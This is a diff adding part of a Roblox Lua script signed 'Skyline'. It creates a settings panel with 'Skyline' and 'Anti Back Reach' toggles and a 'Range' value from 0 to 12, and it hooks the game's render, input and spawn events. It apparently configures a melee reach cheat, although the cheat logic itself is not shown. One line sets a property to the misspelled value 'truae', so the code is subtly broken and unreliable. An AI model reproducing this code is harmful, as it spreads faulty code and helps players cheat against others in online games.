+	Box.Size = UDim2.new(0.925000012, 0, 0.445199907, 0)
+	Box.Font = Enum.Font.SourceSans
+	Box.PlaceholderColor3 = Color3.fromRGB(45, 45, 45)
+	Box.PlaceholderText = tostring((default and default or min))
+	Box.Text = ""
+	Box.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Box.TextScaled = true
+	Box.TextSize = 14.000
+	Box.TextWrapped = true
+
+    local function Update(Text)
+        if tonumber(Text) ~= nil then
+            if min then
+                if tonumber(Text) < min then
+                    Text = min
+                end
+            end
+            if max then
+                if tonumber(Text) > max then
+                    Text = max
+                end
+            end
+            Label.Text = string.format("  %s (%s)",name,Text)
+            callback(Text)
+            Box.PlaceholderText = tostring(Text)
+            Box.Text = ""
+        end
+    end
+
+	Box.FocusLost:Connect(function()
+        Update(Box.Text)
+	end)
+
+	if default then
+		Label.Text = string.format("  %s (%s)",name,default)
+		callback(default)
+	end
+
+    return Update
+end
+
+function createSettingButton(name,callback)
+	local status = false
+	local Setting = Instance.new("Frame")
+	local Label = Instance.new("TextLabel")
+	local Button = Instance.new("TextButton")
+
+
+	Setting.Name = "Setting"
+	Setting.Parent = UIMain
+	Setting.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+	Setting.BackgroundTransparency = 1
+	Setting.BorderSizePixel = 0
+	Setting.Position = UDim2.new(0.0636983067, 0, 0.0351000354, 0)
+	Setting.Size = UDim2.new(0.85, 0, 0.162249923, 0)
+
+	Label.Name = "Label"
+	Label.Parent = Setting
+	Label.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
+	Label.BackgroundTransparency = 1
+	Label.BorderSizePixel = 0
+	Label.Position = UDim2.new(0, 0, 0.0500000007, 0)
+	Label.Size = UDim2.new(1, 0, 0.400000006, 0)
+	Label.Font = Enum.Font.SourceSans
+	Label.Text = string.format("  %s (%s)",name,(status and "On" or "Off"))
+            Label.TextColor3 = (status and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 255, 255))
+	Label.TextScaled = true
+	Label.TextSize = 14.000
+	Label.TextStrokeTransparency = 0.700
+	Label.TextWrapped = true
+	Label.TextXAlignment = Enum.TextXAlignment.Left
+
+	Button.Name = "Button"
+	Button.Parent = Setting
+	Button.AnchorPoint = Vector2.new(0.5, 0)
+	Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Button.BorderSizePixel = 0
+	Button.Position = UDim2.new(0.5, 0, 0.5, 0)
+	Button.Size = UDim2.new(0.925000012, 0, 0.445199907, 0)
+	Button.Font = Enum.Font.SourceSans
+	Button.Text = "Toggle"
+	Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Button.TextScaled = true
+	Button.TextSize = 14.000
+	Button.TextWrapped = truae
+
+    local function Update(v)
+        if status ~= v then
+            status = v
+            Label.Text = string.format("  %s (%s)",name,(status and "On" or "Off"))
+            Label.TextColor3 = (status and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 255, 255))
+            callback(status)
+        end
+    end
+
+	Button.MouseButton1Click:Connect(function()
+		Update(not status)
+	end)
+
+    return Update
+end
+
+TextLabel.Position = functions["get_position"]()
+MainConnections["label_position_adjust"] = workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
+	TextLabel.Position = functions["get_position"]()
+end)
+
+Skyline_settings.update_functions["Skyline"] = createSettingButton("Skyline",function(v)
+	Skyline_settings.SkySize = v
+end)
+
+Skyline_settings.update_functions["Anti Back Reach"] = createSettingButton("Anti Back Reach",function(v)
+	Skyline_settings.legit = v
+end)
+
+Skyline_settings.update_functions["size"] = createSettingBox("Range",function(v)
+	if tonumber(v) ~= nil then
+		Skyline_settings.size = tonumber(v)
+	end
+    MainEvent:Fire("size_change")
+end,Skyline_settings.size,"number",0,12)
+
+
+
+MainConnections["uis"] = UIS.InputBegan:Connect(function(input,no)
+	if no then return end
+	if input.KeyCode == Enum.KeyCode.T then
+		ui.Enabled = not ui.Enabled
+	end
+end)
+
+-- Finish
+
+MainConnections["event_listener"] = MainEvent.Event:Connect(functions["event"])
+MainConnections["main_loop"] = RunService.RenderStepped:Connect(functions["main"])
+MainConnections["character_spawn"] = Player.CharacterAdded:Connect(functions["character_spawn"])
+
+
+if Player.Character then
+    functions["character_spawn"]()
+end
+
+--Yours truly, Skyline
